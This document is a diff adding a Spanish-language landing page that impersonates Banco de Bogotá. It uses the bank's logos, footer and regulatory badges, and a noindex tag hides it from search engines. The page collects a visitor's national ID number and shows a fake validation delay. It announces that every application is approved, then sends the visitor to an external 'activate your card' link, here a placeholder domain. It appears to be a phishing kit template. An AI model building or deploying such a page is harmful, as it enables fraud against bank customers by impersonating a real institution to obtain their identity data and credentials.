@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>¡Solicita tu Tarjeta de Crédito!</title>
+    <meta name="title" content="Solicita tu Tarjeta de Crédito - Fácil y Rápido">
+    <meta name="description" content="Solicita en minutos tu nueva Tarjeta de Crédito. Disfruta de beneficios exclusivos y comienza a comprar lo que siempre quisiste.">
+    <meta name="keywords" content="Tarjeta de crédito, Solicitar tarjeta, Nueva tarjeta, Banco de Bogotá">
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="css/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="css/rwd_landing.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <link rel="stylesheet" href="css/main-bines.css">
+    <style>
+        .tittle-carouse { color: #0040A8; }
+        .hero { background-color: #F8F9FA; }
+        
+        .opening { 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 50vh; 
+        }
+        .textBlock {
+            text-align: center;
+            margin: 0 auto; 
+            max-width: 600px; 
+        }
+        .form-container {
+            margin-top: 20px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+            text-align: left; 
+        }
+
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #007bff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .check-icon {
+            font-size: 80px;
+            color: #28a745; 
+            margin-bottom: 20px;
+        }
+    </style>
+    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="logo-vigilado"><img src="images/logo-vigilado.svg" alt="Logo Vigilado"></div>
+    <div class="sticky-nav animated" id="sticky-bar">
+        <div class="landing-navbar navigation-scroll">
+            <div class="col-lg-4 col-sm-4 logo-bdb landing-logo"></div>
+            <span class="list-group-item nav-item" id="nav-step1">Paso 1: Identificación</span> 
+            <span class="list-group-item nav-item" id="nav-step2">Paso 2: Selección</span> 
+            <span class="list-group-item nav-item" id="nav-step3">Paso 3: Finalización</span> 
+        </div>
+    </div>
+
+    <div class="loader-container" id="loader">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="main-landing-section" id="main-landing-section">
+        <div class="hero" id="section1">
+            <div class="container">
+                <div class="row opening">
+                    
+                    <div class="textBlock col-12 col-lg-8" id="stage1_id">
+                        <h1 class="tittle-carouse">¡Solicita tu Tarjeta de Crédito!</h1>
+                        <p class="text-carouse">Obtén tu <b>nueva Tarjeta de Crédito</b> en minutos. Ingresa tu cédula para <b>comenzar el proceso de solicitud</b>.</p>
+                        
+                        <div class="form-container">
+                            <label for="cedula">Cédula de Ciudadanía:</label>
+                            <input type="text" id="cedula" class="form-control" placeholder="Ej: 1012345678" required>
+                            <br>
+                            <button class="btn-standard btn-Blue" onclick="validateAndLoad('cedula', 5000, 'stage2_tarjeta')">Continuar ></button>
+                        </div>
+                    </div>
+                    <div class="textBlock col-12 col-lg-8" id="stage2_tarjeta" style="display: none;">
+                        <h1 class="tittle-carouse">Selecciona tu Tarjeta</h1>
+                        <p class="text-carouse">Hemos validado tu información. Ahora, selecciona el <b>tipo de tarjeta</b> que deseas solicitar.</p>
+                        
+                        <div class="form-container">
+                            <label for="tipo-tarjeta">Tipo de Tarjeta:</label>
+                            <select id="tipo-tarjeta" class="form-control" required>
+                                <option value="">Seleccione el tipo de tarjeta</option>
+                                <option value="clasica">Tarjeta Clásica</option>
+                                <option value="oro">Tarjeta Oro</option>
+                                <option value="platinum">Tarjeta Platinum</option>
+                                <option value="black">Tarjeta Black</option>
+                            </select>
+                            <br>
+                            <button class="btn-standard btn-Blue" onclick="validateAndLoad('tipo-tarjeta', 3000, 'stage3_final')">Confirmar Solicitud ></button>
+                        </div>
+                    </div>
+                    <div class="textBlock col-12 col-lg-8" id="stage3_final" style="display: none;">
+                        <p class="check-icon">&#10003;</p>
+                        <h1 class="tittle-carouse" style="color: #28a745;">¡Felicidades! Solicitud Aprobada</h1>
+                        <p class="text-carouse">¡Tu solicitud ha sido <b>aprobada</b>! Para completar el proceso y recibir tu nueva Tarjeta de Crédito, debes <b>confirmar y activarla</b> en el siguiente enlace.</p>
+                        
+                        <div class="btn-Principal">
+                            <a href="https://ejemplo.com/activar-tarjeta" target="_blank" class="btn-standard btn-Blue">
+                                Confirma y Activa tu Tarjeta aquí >
+                            </a>
+                        </div>
+                        <br>
+                        </div>
+                    </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="nivel footer">
+        <div class="cont-footer">
+            <figure class="logo-footer"><img class="tb-only" src="images/logo-bdb-footer.svg" alt="Banco de Bogotá"> <img class="mb-only" src="images/simbolo-color.svg" alt="Banco de Bogotá"></figure>
+            <div class="otros">
+                <h3 class="tit03 tit03--white">Productos digitales</h3>
+                <ul>
+                    <li><a class="link02" href="#">Cuenta de Ahorros</a></li>
+                    <li><a class="link02" href="#">Crédito de Libranza</a></li>
+                </ul>
+            </div>
+            <div class="descargas">
+                <h3 class="tit03 tit03--white">Descarga nuestra app</h3>
+                <a class="btn-playstore btn-playstore--white" href="#" target="_blank" rel="nofollow"></a> <a class="btn-appstore btn-appstore--white" href="#" target="_blank" rel="nofollow"></a>
+            </div>
+        </div>
+        <div class="legal">
+            <div class="">
+                <figure class="aval-fogafin"><img src="images/aval-fogafin.svg" alt="AVAL - fogafin"></figure>
+                <div class="txt-legal"><p class="txt03 txt03--clear">Para más información puedes contactarnos en nuestra Servilínea...</p></div>
+            </div>
+        </div>
+    </footer>
+    <div class="cookies" id="cookie"><div class="content"><div class="content__text">Usamos cookies para mejorar tu experiencia. <span class="cookie__link" onclick="redirectCookies()">Ver términos y condiciones ></span></div><div class="content__btn-close" onclick="closeCookie()" id="closebtnC"></div></div></div>
+    
+    <script>
+        const stages = ['stage1_id', 'stage2_tarjeta', 'stage3_final'];
+        const navs = ['nav-step1', 'nav-step2', 'nav-step3'];
+
+        function updateNav(currentStageId) {
+            navs.forEach(navId => {
+                const element = document.getElementById(navId);
+                element.style.fontWeight = 'normal';
+                element.style.color = '';
+            });
+
+            const index = stages.indexOf(currentStageId);
+            if (index !== -1) {
+                const navElement = document.getElementById(navs[index]);
+                navElement.style.fontWeight = 'bold';
+                navElement.style.color = '#007bff';
+            }
+        }
+
+        function showStage(stageId) {
+            stages.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) {
+                    element.style.display = (id === stageId) ? 'block' : 'none';
+                }
+            });
+            updateNav(stageId);
+        }
+
+        function showLoader(duration, nextStageId) {
+            const loader = document.getElementById('loader');
+
+            stages.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) element.style.display = 'none';
+            });
+
+            loader.style.display = 'flex';
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                showStage(nextStageId);
+            }, duration);
+        }
+
+        function validateAndLoad(inputId, duration, nextStageId) {
+            const inputElement = document.getElementById(inputId);
+            const value = inputElement ? inputElement.value : '';
+
+            if (inputId === 'cedula') {
+                if (value.length < 5) {
+                    alert("Por favor, ingresa un número de cédula válido.");
+                    return;
+                }
+            } else if (inputId === 'tipo-tarjeta') {
+                if (!value) {
+                    alert("Por favor, selecciona el tipo de tarjeta que deseas.");
+                    return;
+                }
+            }
+
+            showLoader(duration, nextStageId);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            showStage('stage1_id');
+        });
+    </script>
+    
+    <script type="text/javascript">sessionStorage.removeItem('campaign');</script><script src="js/config.js"></script><script src="js/jquery-3.3.1.min.js"></script><script src="js/popper.min.js"></script><script src="js/bootstrap.min.js"></script><script src="js/jquery.waypoints.min.js"></script><script src="js/bowser.min.js"></script><script src="js/landing-common.js"></script><script src="js/capture-utm.js"></script>
+</body>
+</html>
